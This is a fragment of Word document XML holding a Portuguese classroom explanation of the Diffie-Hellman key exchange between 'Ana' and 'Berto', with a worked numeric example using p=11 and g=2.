                        </wps:bodyPr>
                      </wps:wsp>
                      <wps:wsp>
                        <wps:cNvPr id="1908320581" name="Retângulo 1053166205"/>
                        <wps:cNvSpPr>
                          <a:spLocks noChangeArrowheads="1"/>
                        </wps:cNvSpPr>
                        <wps:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="8796" y="21938"/>
                            <a:ext cx="9267" cy="5385"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:ln w="9525">
                            <a:solidFill>
                              <a:srgbClr val="FFFFFF"/>
                            </a:solidFill>
                            <a:round/>
                            <a:headEnd type="none" w="sm" len="sm"/>
                            <a:tailEnd type="none" w="sm" len="sm"/>
                          </a:ln>
                        </wps:spPr>
                        <wps:txbx>
                          <w:txbxContent>
                            <w:p w14:paraId="37DD0958" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                              <w:pPr>
                                <w:spacing w:line="240" w:lineRule="auto"/>
                                <w:jc w:val="center"/>
                              </w:pPr>
                            </w:p>
                          </w:txbxContent>
                        </wps:txbx>
                        <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="ctr" anchorCtr="0" upright="1">
                          <a:noAutofit/>
                        </wps:bodyPr>
                      </wps:wsp>
                      <wps:wsp>
                        <wps:cNvPr id="255374466" name="Caixa de texto 1805798131"/>
                        <wps:cNvSpPr txBox="1">
                          <a:spLocks noChangeArrowheads="1"/>
                        </wps:cNvSpPr>
                        <wps:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="1331" y="737"/>
                            <a:ext cx="25168" cy="4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C4179" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                              <w:pPr>
                                <w:spacing w:line="240" w:lineRule="auto"/>
                              </w:pPr>
                              <w:r>
                                <w:rPr>
                                  <w:color w:val="000000"/>
                                  <w:sz w:val="28"/>
                                </w:rPr>
                                <w:t>Ana                               Berto</w:t>
                              </w:r>
                            </w:p>
                          </w:txbxContent>
                        </wps:txbx>
                        <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="t" anchorCtr="0" upright="1">
                          <a:spAutoFit/>
                        </wps:bodyPr>
                      </wps:wsp>
                    </wpg:wgp>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:group w14:anchorId="0C489F35" id="Agrupar 20" o:spid="_x0000_s1028" style="width:219.6pt;height:318.85pt;mso-position-horizontal-relative:char;mso-position-vertical-relative:line" coordorigin="1331,737" coordsize="25168,36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9" type="#_x0000_t75" style="position:absolute;left:1524;top:3497;width:23812;height:338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">
                  <v:imagedata r:id="rId28" o:title="" croptop="3610f"/>
                </v:shape>
                <v:rect id="Retângulo 161554767" o:spid="_x0000_s1030" style="position:absolute;left:8369;top:3190;width:10122;height:15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" strokecolor="white">
                  <v:stroke startarrowwidth="narrow" startarrowlength="short" endarrowwidth="narrow" endarrowlength="short" joinstyle="round"/>
                  <v:textbox inset="2.53958mm,2.53958mm,2.53958mm,2.53958mm">
                    <w:txbxContent>
                      <w:p w14:paraId="63FFBF18" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                        <w:pPr>
                          <w:spacing w:line="240" w:lineRule="auto"/>
                          <w:jc w:val="center"/>
                        </w:pPr>
                      </w:p>
                    </w:txbxContent>
                  </v:textbox>
                </v:rect>
                <v:rect id="Retângulo 1889938234" o:spid="_x0000_s1031" style="position:absolute;left:8796;top:27324;width:9267;height:10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" strokecolor="white">
                  <v:stroke startarrowwidth="narrow" startarrowlength="short" endarrowwidth="narrow" endarrowlength="short" joinstyle="round"/>
                  <v:textbox inset="2.53958mm,2.53958mm,2.53958mm,2.53958mm">
                    <w:txbxContent>
                      <w:p w14:paraId="6552E30B" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                        <w:pPr>
                          <w:spacing w:line="240" w:lineRule="auto"/>
                          <w:jc w:val="center"/>
                        </w:pPr>
                      </w:p>
                    </w:txbxContent>
                  </v:textbox>
                </v:rect>
                <v:rect id="Retângulo 1053166205" o:spid="_x0000_s1032" style="position:absolute;left:8796;top:21938;width:9267;height:5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" strokecolor="white">
                  <v:stroke startarrowwidth="narrow" startarrowlength="short" endarrowwidth="narrow" endarrowlength="short" joinstyle="round"/>
                  <v:textbox inset="2.53958mm,2.53958mm,2.53958mm,2.53958mm">
                    <w:txbxContent>
                      <w:p w14:paraId="37DD0958" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                        <w:pPr>
                          <w:spacing w:line="240" w:lineRule="auto"/>
                          <w:jc w:val="center"/>
                        </w:pPr>
                      </w:p>
                    </w:txbxContent>
                  </v:textbox>
                </v:rect>
                <v:shape id="Caixa de texto 1805798131" o:spid="_x0000_s1033" type="#_x0000_t202" style="position:absolute;left:1331;top:737;width:25168;height:4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" filled="f" stroked="f">
                  <v:textbox style="mso-fit-shape-to-text:t" inset="2.53958mm,2.53958mm,2.53958mm,2.53958mm">
                    <w:txbxContent>
                      <w:p w14:paraId="35BC4179" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                        <w:pPr>
                          <w:spacing w:line="240" w:lineRule="auto"/>
                        </w:pPr>
                        <w:r>
                          <w:rPr>
                            <w:color w:val="000000"/>
                            <w:sz w:val="28"/>
                          </w:rPr>
                          <w:t>Ana                               Berto</w:t>
                        </w:r>
                      </w:p>
                    </w:txbxContent>
                  </v:textbox>
                </v:shape>
                <w10:anchorlock/>
              </v:group>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="22563499" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="602C8B20" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="201" w:name="_1tw6d4bmdy"/>
      <w:bookmarkEnd w:id="201"/>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Passos simplificados:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E237A6" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Ambos os utilizadores concordam publicamente em dois números:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7D99CC" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Um número primo grande “p”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6981ED51" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Uma base “g” (gerador)</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="387A1DD5" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Cada um escolhe um </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>segredo privado</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD75350" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Ana escolhe “a”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A40339" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Berto escolhe bbb</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="291C6F69" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Cada um calcula um </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>valor público</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EAD07B" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Ana envia A=g^a mod  ”p”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="454CE782" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:lastRenderedPageBreak/>
        <w:t>Berto envia B=g^b  mod “p”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325A447D" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C023638" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BE6CEC6" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Cada um calcula a </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>chave secreta partilhada</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="30973FE6" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Ana: K=B^a  mod “p”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="357B1659" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Berto: K=A^b  mod “p”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E152C39" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>O resultado é o mesmo: K = g^{ab} mod “p”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4E6305" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63398843" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Exemplo com números:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Configuração</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312D5D30" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Número primo: p = 11</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
        <w:t>Base: g = 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345CD507" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Segredo de Ana: a = 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
        <w:t>Segredo de Berto: b = 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6865382B" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00000000" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="637CB8B8">
          <v:rect id="_x0000_i1030" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E28C688" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1. Cálculo das chaves públicas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D54FB04" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Ana:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502E975A" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A = g^a mod p = 2^3 mod 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26713BCD" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2^3 = 8</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 8 mod 11 = 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610FF4B9" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Ana envia 8 para Berto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2C4176" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00000000" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="42C75265">
          <v:rect id="_x0000_i1031" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D8270F" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Berto:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675F2019" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>B = g^b mod p = 2^7 mod 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="475F3B05" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Passo a passo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6803C9" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>2^1 = 2 mod 11 = 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
        <w:t xml:space="preserve"> 2^2 = 4 mod 11 = 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> 2^4 = (2^2)^2 = 4^2 = 16 mod 11 = 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:br/>
        <w:t xml:space="preserve"> 2^7 = 2^4 * 2^2 * 2^1 = 5 * 4 * 2 = 40 mod 11 = 40 - 33 = 7</w:t>
      </w:r>
    </w:p>
